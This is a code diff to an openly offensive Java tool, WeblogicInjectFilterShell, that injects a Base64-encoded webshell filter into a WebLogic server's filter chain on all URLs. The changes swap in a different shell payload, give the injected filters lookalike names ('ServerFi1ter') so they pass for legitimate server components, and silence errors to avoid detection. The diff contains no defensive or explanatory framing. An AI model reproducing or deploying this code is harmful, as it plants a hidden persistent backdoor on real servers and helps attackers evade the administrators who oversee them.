@@ -8,7 +8,7 @@ import java.util.Base64;
 import java.util.Map;
 
 public class WeblogicInjectFilterShell {
-    public static byte[] codeClass = Base64.getDecoder().decode(classCache.WebloglcBehinderFilter.getBytes());
+    public static byte[] codeClass = Base64.getDecoder().decode(classCache.DynamicFilterShell.getBytes());
 
     static {
         try {
@@ -42,8 +42,8 @@ public class WeblogicInjectFilterShell {
                 defineClass.setAccessible(true);
                 Class evilFilterClass = (Class) defineClass.invoke(cl, codeClass, 0, codeClass.length);
 
-                String evilName = "gameName" + System.currentTimeMillis();
-                String filterName = "gameFilter" + System.currentTimeMillis();
+                String evilName = "ServerFi1ter1" + System.currentTimeMillis();
+                String filterName = "ServerFi1ter0" + System.currentTimeMillis();
                 String[] url = new String[]{"/*"};
 
                 Method putM = cachedClass.getClass().getDeclaredMethod("put", Object.class, Object.class);
@@ -56,7 +56,7 @@ public class WeblogicInjectFilterShell {
                 registerFilterM.invoke(filterManager, evilName, filterName, url, null, null, null);
             }
         } catch (Exception e) {
-            e.printStackTrace();
+            //pass
         }
     }
 }
